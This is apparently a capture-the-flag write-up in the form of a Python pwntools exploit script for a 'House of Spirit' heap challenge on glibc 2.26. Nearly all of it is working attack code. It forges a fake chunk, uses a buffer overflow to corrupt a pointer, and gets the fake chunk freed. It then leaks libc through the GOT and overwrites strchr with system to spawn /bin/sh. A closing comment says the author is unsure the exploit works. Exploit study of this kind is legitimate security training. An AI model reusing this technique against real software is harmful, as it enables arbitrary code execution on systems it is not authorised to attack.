'''
House of Spirit Challenge writeup
''' 
from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '' # For alternate version of libc
env = {}

# Binary setup
elf_name = 'challenge-2.26'
libc_name = "/home/strikeout/Desktop/tools/how2heap/glibc_versions/libc-2.26.so"
elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p)
else: 
	p = remote(domain, port) 

# Send the name of the resturant
def set_resturant(name, intro=False):
	if(intro == False): 
		p.sendlineafter(">", "5")

	p.sendlineafter("name", name)

# Add a sandwich (order)
def add(jelly, butter): 
	p.sendlineafter(">", "1") 
	p.sendlineafter("Type: ", jelly) # Input for butter
	p.sendlineafter("Type: ", butter)  # Input for jelly
	return 

# Remove the sandwich (eat)
def remove(index):
	p.sendlineafter(">", "2") 
	p.sendlineafter("remove:", str(index))
	return 

# Edit the most recent order
def edit(jelly, butter):
	p.sendlineafter(">", "4") 
	p.sendlineafter("Type: ", jelly) # Input for butter 
	p.sendlineafter("Type: ", butter) # Input for jelly 
	return 

# Print a sandwich
def print_wich(index): 
	p.sendlineafter(">", "3") 
	p.sendlineafter("view:", str(index))
	p.recvuntil("made a ") 
	butter = p.recvuntil(" butter").replace(" butter", "")
	p.recvuntil("and ")  
	jelly = p.recvuntil(" jelly").replace(" jelly", "") 
	return butter, jelly 

# Performs the house of spirit
def house_of_spirit():

	#######################
	# Create a fake chunk #
	#######################
	# The sizes of all the orders are of 0x40
	chunk_size = 0x40 

	# Filler for the prev_size 
	fake_chunk = p64(0x0) 	# Offset 0x0
	
	# The fake chunk size
	fake_chunk += p64(chunk_size) # Offset 0x8

	# Filler prior to the next chunk at offset 0x40
	fake_chunk += "B" * 0x30

	# prev_size of the next chunk
	fake_chunk += p64(0x0) 

	# Next Chunk size (needs to be greater than 0x20 and less than system_mem)
	fake_chunk += p64(0x20) 

	# Use the resturant name as a fake chunk for later
	set_resturant(fake_chunk, intro = True)


	###########################
	# Exploit Buffer Overflow #
	###########################
	'''
	The structure (after the butter variable) has a pointer to 
	the 'next' ptr. Because the butter variable has a buffer 
	overflow, we can OVERWRITE this with an arbitrary value.

	We will set the 'next' pointer to the fake_chunk 
	(from the previous step) that we made.
	'''

	print "Overwriting pointer with 0x40 chunk via buffer overflow"

	# Filler prior to overflow
	butter = "A" * 40 
	
	# Location of the 'resturant_name' variable, which holds our fake chunk.
	# We add 0x10 because the pointer (that the user is given) is mem + 0x10.
	butter += p64(elf.symbols['resturant_name'] + 0x10) 

	# Exploit the buffer overflow to overflow 'next' ptr.
	add("B" * 8, butter)
	
	###################
	# House of Spirit #
	################### 
	print "Freeing arbitrary pointer (House of Spirit)" 
	print "The resturant_name variable is now in the 0x40 fastbin"	
	# Puts the 'fake chunk' (resturant_name variable) into the 0x40 fastbin
	remove(1)

def win():
	
	''' 
	The 0x40 fastbin has a single chunk inside of it, 
	which is the resturant_name variable fake_chunk 

	If we create a NEW order, the chunk will be allocated to us. 

	Because we control the 'resturant_name' variable, we 
	will be able to create an arbitrary write or read primative 
	by overriding the sandwich->jelly_ptr variable.
	'''

	#####################
	# Overlapping Chunk #
	#####################

	# Get the overlapping chunk that was added by the House of Spirit in the previous step
	add("C" * 8, "D" * 8) 


	##########################
	# Leak via Ptr Overwrite #		
	##########################
	print "Writing GOT table address over jelly_ptr to leak LibC"	

	# Overwrite the 'jelly_ptr' in order to create an arbitrary read/write.
	# The jelly_ptr is overwritten with the location of the strchr GOT entry	# This will have an address to GLibC at this location.
	set_resturant("A" * 0x10 + p64(elf.got['strchr']) + "B" * 0x8)
	_, jelly = print_wich(1)

	# By using the 'jelly_ptr' at strchar GOT entry, we leak GLibC.
	libc_leak = u64(jelly + "\x00\x00") 
	libc_base = libc_leak - libc_offset
	print "LibC leak: ", hex(libc_base)


	##################
	# Code Execution # 
	##################
	print "Overwrite strchr with system"
	'''
	The 'jelly_ptr' is pointing to 'strchr' GOT entry. 
	We overwrite this with 'system' because this gives us an easy shell. 
	'strchr' is a great GOT entry to overwrite because it accepts a 
	string that we control as the input. This emulates us calling system
	in the best way possible.

	Butter is used as the parameter for 'system'. This is because 
	'strchr' takes in a parameter that is a pointer to a string. 
	By passing in the buffer variable (which we control), we can 
	control the parameter for system.

	Additionally, the value of printf must also be written. But, why? 
	The GOT table looks like the following: 
	- strchr_addr 
	- printf_addr 
	- _libc_start_main

	If we do not write over the top of printf with the LibC printf 
	address, then printf gets corrupted via a newline,
	which causes the program to crash. 
	'''
	edit(p64(libc_base + system_offset) + p64(libc_base + printf_offset), "/bin/sh")
	p.sendline("ls")	
''' 
Plan: 

- Overwrite next pointer to point to the resturant (with a fake chunk) 
- House of spirit (free the chunk that we just corrupted) 
- Edit resturant to change jelly_ptr to PLT/GOT entry 
	- Use this to read (leak LibC) 
	- Use this to write (system) 
- Win :)


Appears to not work because of rdx and rsi having values on the syscall. however, if we directly call system, this should not matter, right? Ahhhh
'''

system_offset = 0x40990
printf_offset = 0x53f30
libc_offset = 0x14ce60

house_of_spirit()
win()
p.interactive()


